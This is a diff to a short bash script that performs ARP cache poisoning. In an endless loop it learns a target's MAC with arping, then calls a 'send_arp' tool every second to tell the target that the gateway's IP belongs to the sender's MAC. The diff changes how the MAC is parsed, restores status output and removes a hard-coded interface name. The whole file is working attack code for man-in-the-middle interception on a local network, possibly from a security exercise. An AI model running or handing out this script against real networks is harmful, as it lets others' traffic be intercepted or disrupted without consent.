@@ -1,4 +1,4 @@
-#! /bin/bash
+#!/bin/bash
 
 if [ $# -ne 1 ];
 then
@@ -16,19 +16,21 @@ GATEWAY=$(netstat -rn | grep -e '^0\.0\.0\.0' | awk '{print $2}')
 while true;
 do
 
-	#send ARP
-	arping -q -I ${IFACE} -c 1 ${1}
+	#send ARP && take target mac
+	#$TMAC=$( arping -I ${IFACE} -c 1 "${1}" | grep "reply from ${1}" | awk -F ' ' '{print $4}' )
+	#$TMAC=$( arping -I ${iface} -c 1 ${1} | grep "reply from ${1}" | awk -F ' ' '{print $4}' )
+	TMAC=$(arping -I ${IFACE} -c 1 ${1} | grep "reply from ${1}" | awk -F ' ' '{print $5}')
+	TMAC=${TMAC:1:17};
 
-	#check target MAc
-	TMAC=$( arp -an | grep -w "${1}" | awk -F ' ' '{print $4}' )
+	
 
 
-	#echo -e "\n=================Information======================="
-	#echo "${IFACE}  IP: ${MYIP} - MAC: ${MYMAC} GATEWAY: ${GATEWAY}"
-	#echo "target IP : ${1} target MAC : ${TMAC}"
+	echo -e "\n=================Information======================="
+	echo "${IFACE}  IP: ${MYIP} - MAC: ${MYMAC} GATEWAY: ${GATEWAY}"
+	echo "target IP : ${1} target MAC : ${TMAC}"
 
 	echo "======send ARP Packet======"
-	send_arp ${GATEWAY} ${MYMAC} ${1} ${TMAC} ens33 ${MYMAC} ${TMAC}
+	send_arp ${GATEWAY} ${MYMAC} ${1} ${TMAC} ${IFACE} ${MYMAC} ${TMAC}
 	sleep 1
 done;
 
